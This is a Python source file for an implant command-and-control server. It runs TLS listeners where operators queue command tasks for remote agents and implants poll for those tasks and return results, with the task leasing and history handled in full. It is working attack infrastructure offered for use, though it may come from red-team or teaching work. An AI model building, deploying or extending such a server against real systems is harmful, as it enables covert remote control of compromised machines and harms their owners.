import collections
import pathlib
import socket
import ssl
import struct
import threading
import time
import sys


from protocol import (
    DEFAULT_AGENT_ID,
    MSG_AGENT_GET_TASK,
    MSG_AGENT_POST_RESULT,
    MSG_ERROR,
    MSG_OPERATOR_LIST_HISTORY,
    MSG_OPERATOR_LIST_PENDING,
    MSG_OPERATOR_GET_RESULT,
    MSG_OPERATOR_SUBMIT_TASK,
    MSG_SERVER_ACK,
    MSG_SERVER_NO_TASK,
    MSG_SERVER_PENDING,
    MSG_SERVER_RESULT,
    MSG_SERVER_TASK_HISTORY,
    MSG_SERVER_TASK_LIST,
    MSG_SERVER_TASK,
    MESSAGE_NAMES,
    TASK_STATE_COMPLETED_CODE,
    TASK_STATE_LEASED_CODE,
    TASK_STATE_QUEUED_CODE,
    recv_http_tlv,
    send_http_response,
)


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------



TASK_LEASE_TIMEOUT_SECONDS = 30

_SCRIPT_DIR = pathlib.Path(__file__).parent
CERT_FILE   = _SCRIPT_DIR / "server.crt"
KEY_FILE    = _SCRIPT_DIR / "server.key"

# ---------------------------------------------------------------------------
# Task state machine
# ---------------------------------------------------------------------------

TASK_STATE_QUEUED    = "queued"
TASK_STATE_LEASED    = "leased"
TASK_STATE_COMPLETED = "completed"

TASK_QUEUE  = collections.deque()
TASKS       = {}
TASK_LOCK   = threading.Lock()
NEXT_TASK_ID = 1


def log_message(prefix, message_type, payload_length, details=""):
    """Print a consistent debug line for each server-side protocol event."""
    timestamp    = time.strftime("%H:%M:%S")
    message_name = MESSAGE_NAMES.get(message_type, f"0x{message_type:08X}")
    suffix       = f" {details}" if details else ""
    print(
        f"[{timestamp}] [{prefix}] {message_name} "
        f"payload={payload_length}{suffix}"
    )


def get_next_task_id():
    global NEXT_TASK_ID
    task_id      = NEXT_TASK_ID
    NEXT_TASK_ID += 1
    return task_id


def requeue_expired_tasks():
    with TASK_LOCK:
        current_time = time.time()
        for task in TASKS.values():
            if task["state"] != TASK_STATE_LEASED:
                continue
            if current_time - task["leased_at"] < TASK_LEASE_TIMEOUT_SECONDS:
                continue
            task["state"]     = TASK_STATE_QUEUED
            task["leased_at"] = 0.0
            TASK_QUEUE.append(task)


def lease_next_task(agent_id):
    with TASK_LOCK:
        for task in list(TASK_QUEUE):
            if task["agent_id"] != agent_id:
                continue
            if task["state"] != TASK_STATE_QUEUED:
                continue
            TASK_QUEUE.remove(task)
            task["state"]     = TASK_STATE_LEASED
            task["leased_at"] = time.time()
            return task
    return None


def pack_task_payload(task):
    header = struct.pack(
        "<III",
        task["task_id"],
        task["command_id"],
        len(task["arg_bytes"]),
    )
    return header + task["arg_bytes"]


def pack_result_payload(task):
    result_bytes = task.get("result_bytes", b"")
    header = struct.pack(
        "<IIII",
        task["task_id"],
        task["command_id"],
        task["status"],
        len(result_bytes),
    )
    return header + result_bytes


def encode_task_state(task):
    if task["state"] == TASK_STATE_QUEUED:    return TASK_STATE_QUEUED_CODE
    if task["state"] == TASK_STATE_LEASED:    return TASK_STATE_LEASED_CODE
    if task["state"] == TASK_STATE_COMPLETED: return TASK_STATE_COMPLETED_CODE
    return 0


def pack_pending_task_list():
    entries = []
    with TASK_LOCK:
        for task in TASKS.values():
            if task["state"] not in {TASK_STATE_QUEUED, TASK_STATE_LEASED}:
                continue
            entries.append(struct.pack(
                "<IIII",
                task["task_id"],
                task["agent_id"],
                task["command_id"],
                encode_task_state(task),
            ))
    return struct.pack("<I", len(entries)) + b"".join(entries)


def pack_task_history():
    entries = []
    with TASK_LOCK:
        for task_id in sorted(TASKS):
            task = TASKS[task_id]
            entries.append(struct.pack(
                "<IIIII",
                task["task_id"],
                task["agent_id"],
                task["command_id"],
                encode_task_state(task),
                task.get("status", 0),
            ))
    return struct.pack("<I", len(entries)) + b"".join(entries)


# ---------------------------------------------------------------------------
# Per-request implant handlers
# ---------------------------------------------------------------------------

def handle_agent_get_task(conn, payload):
    """Respond to MSG_AGENT_GET_TASK with a task or MSG_SERVER_NO_TASK."""
    if len(payload) < 4:
        send_http_response(conn, MSG_ERROR)
        return

    agent_id = struct.unpack("<I", payload[:4])[0]
    log_message("implant", MSG_AGENT_GET_TASK, len(payload), f"agent_id={agent_id}")

    requeue_expired_tasks()
    task = lease_next_task(agent_id)

    if task is None:
        log_message("server", MSG_SERVER_NO_TASK, 0, f"agent_id={agent_id}")
        send_http_response(conn, MSG_SERVER_NO_TASK)
        return

    task_payload = pack_task_payload(task)
    log_message(
        "server", MSG_SERVER_TASK, len(task_payload),
        f"agent_id={agent_id} task_id={task['task_id']} "
        f"command_id=0x{task['command_id']:08X}",
    )
    send_http_response(conn, MSG_SERVER_TASK, task_payload)


def handle_agent_post_result(conn, payload):
    """Respond to MSG_AGENT_POST_RESULT with MSG_SERVER_ACK."""
    if len(payload) < 20:
        send_http_response(conn, MSG_ERROR)
        return

    agent_id, task_id, command_id, status, result_length = struct.unpack(
        "<IIIII", payload[:20]
    )
    result_bytes = payload[20:20 + result_length]
    log_message(
        "implant", MSG_AGENT_POST_RESULT, len(payload),
        f"agent_id={agent_id} task_id={task_id} "
        f"command_id=0x{command_id:08X} status=0x{status:08X}",
    )

    with TASK_LOCK:
        task = TASKS.get(task_id)
        if task is not None:
            task["agent_id"]    = agent_id
            task["command_id"]  = command_id
            task["status"]      = status
            task["result_bytes"] = result_bytes
            task["state"]       = TASK_STATE_COMPLETED
            task["completed_at"] = time.time()

    log_message("server", MSG_SERVER_ACK, 4, f"task_id={task_id}")
    send_http_response(conn, MSG_SERVER_ACK, struct.pack("<I", task_id))


# ---------------------------------------------------------------------------
# Connection handlers
# ---------------------------------------------------------------------------

def handle_implant_client(conn):
    """Route one HTTP request from an implant to the appropriate handler."""
    try:
        message = recv_http_tlv(conn)
        if message is None:
            print(f"[{time.strftime('%H:%M:%S')}] [!] recv_http_tlv returned None (bad HTTP or empty body)", flush=True)
            send_http_response(conn, MSG_ERROR)
            return

        message_type, payload = message

        if message_type == MSG_AGENT_GET_TASK:
            handle_agent_get_task(conn, payload)
        elif message_type == MSG_AGENT_POST_RESULT:
            handle_agent_post_result(conn, payload)
        else:
            log_message("implant", message_type, len(payload), "unexpected_type")
            send_http_response(conn, MSG_ERROR)
    except Exception as e:
        print(f"[{time.strftime('%H:%M:%S')}] [!] implant handler error: {e}", flush=True)
    finally:
        conn.close()


def handle_operator_client(conn):
    """Handle one HTTP request from the operator interface."""
    try:
        message = recv_http_tlv(conn)
        if message is None:
            send_http_response(conn, MSG_ERROR)
            return

        message_type, payload = message

        if message_type == MSG_OPERATOR_SUBMIT_TASK:
            if len(payload) < 12:
                send_http_response(conn, MSG_ERROR)
                return

            agent_id, command_id, arg_length = struct.unpack("<III", payload[:12])
            arg_bytes = payload[12:12 + arg_length]
            log_message(
                "operator", message_type, len(payload),
                f"agent_id={agent_id} command_id=0x{command_id:08X} "
                f"arg_length={arg_length}",
            )

            with TASK_LOCK:
                task_id = get_next_task_id()
                task = {
                    "task_id":     task_id,
                    "agent_id":    agent_id,
                    "command_id":  command_id,
                    "arg_bytes":   arg_bytes,
                    "status":      0,
                    "result_bytes": b"",
                    "state":       TASK_STATE_QUEUED,
                    "leased_at":   0.0,
                    "completed_at": 0.0,
                }
                TASKS[task_id] = task
                TASK_QUEUE.append(task)

            log_message(
                "server", MSG_SERVER_ACK, 4,
                f"task_id={task_id} agent_id={agent_id} "
                f"command_id=0x{command_id:08X}",
            )
            send_http_response(conn, MSG_SERVER_ACK, struct.pack("<I", task_id))
            return

        if message_type == MSG_OPERATOR_GET_RESULT:
            if len(payload) < 4:
                send_http_response(conn, MSG_ERROR)
                return

            task_id = struct.unpack("<I", payload[:4])[0]
            log_message("operator", message_type, len(payload), f"task_id={task_id}")

            with TASK_LOCK:
                task = TASKS.get(task_id)

            if task is None:
                send_http_response(conn, MSG_ERROR)
                return

            if task["state"] != TASK_STATE_COMPLETED:
                log_message(
                    "server", MSG_SERVER_PENDING, 4,
                    f"task_id={task_id} state={task['state']}",
                )
                send_http_response(conn, MSG_SERVER_PENDING, struct.pack("<I", task_id))
                return

            result_payload = pack_result_payload(task)
            log_message(
                "server", MSG_SERVER_RESULT, len(result_payload),
                f"task_id={task_id} status=0x{task['status']:08X}",
            )
            send_http_response(conn, MSG_SERVER_RESULT, result_payload)
            return

        if message_type == MSG_OPERATOR_LIST_PENDING:
            log_message("operator", message_type, len(payload))
            pending = pack_pending_task_list()
            send_http_response(conn, MSG_SERVER_TASK_LIST, pending)
            return

        if message_type == MSG_OPERATOR_LIST_HISTORY:
            log_message("operator", message_type, len(payload))
            history = pack_task_history()
            send_http_response(conn, MSG_SERVER_TASK_HISTORY, history)
            return

        send_http_response(conn, MSG_ERROR)
    except Exception:
        pass
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Accept loop
# ---------------------------------------------------------------------------

def accept_loop(server_sock, handler):
    while True:
        try:
            client_conn, addr = server_sock.accept()
            print(f"[{time.strftime('%H:%M:%S')}] [conn] accepted from {addr[0]}:{addr[1]}", flush=True)
        except ssl.SSLError as e:
            # TLS handshake failed — most common cause: implant cert validation
            # rejected the self-signed cert, or Schannel couldn't complete the
            # handshake.  Print it so you can see whether connections arrive.
            print(f"[{time.strftime('%H:%M:%S')}] [!] TLS handshake failed: {e}", flush=True)
            continue
        except OSError:
            break
        thread = threading.Thread(target=handler, args=(client_conn,), daemon=True)
        thread.start()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def _build_ssl_context():
    if not CERT_FILE.exists() or not KEY_FILE.exists():
        raise FileNotFoundError(
            f"TLS certificate not found.  Run:  python server/gen_certs.py"
        )
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.load_cert_chain(certfile=str(CERT_FILE), keyfile=str(KEY_FILE))
    return ctx


def main():

    if len(sys.argv) < 3:
        print("python server.py <Implant Port callback port> <Operator Port callback port>")
        return 0
     

    try:
        IMPLANT_PORT  = int(sys.argv[1])#9001
        OPERATOR_PORT = int(sys.argv[2])#9002
        LISTEN_HOST   = "0.0.0.0"
    except ValueError: 
        print("Please use valid port numbers")


    ssl_ctx = _build_ssl_context()

    # --- Implant listener (TLS) ---
    raw_implant = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_implant.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_implant.bind((LISTEN_HOST, IMPLANT_PORT))
    raw_implant.listen(5)
    implant_server = ssl_ctx.wrap_socket(raw_implant, server_side=True)

    # --- Operator listener (TLS) ---
    raw_operator = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_operator.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_operator.bind((LISTEN_HOST, OPERATOR_PORT))
    raw_operator.listen(5)
    operator_server = ssl_ctx.wrap_socket(raw_operator, server_side=True)

    print(f"[*] Implant  listener  (HTTPS) on port {IMPLANT_PORT}")
    print(f"[*] Operator listener  (HTTPS) on port {OPERATOR_PORT}")
    print(f"[*] Default agent id: {DEFAULT_AGENT_ID}")
    print(f"[*] Certificate: {CERT_FILE}")

    implant_thread = threading.Thread(
        target=accept_loop,
        args=(implant_server, handle_implant_client),
        daemon=True,
    )
    operator_thread = threading.Thread(
        target=accept_loop,
        args=(operator_server, handle_operator_client),
        daemon=True,
    )
    implant_thread.start()
    operator_thread.start()

    try:
        while True:
            time.sleep(1.0)
    except KeyboardInterrupt:
        pass
    finally:
        implant_server.close()
        operator_server.close()


if __name__ == "__main__":
    main()
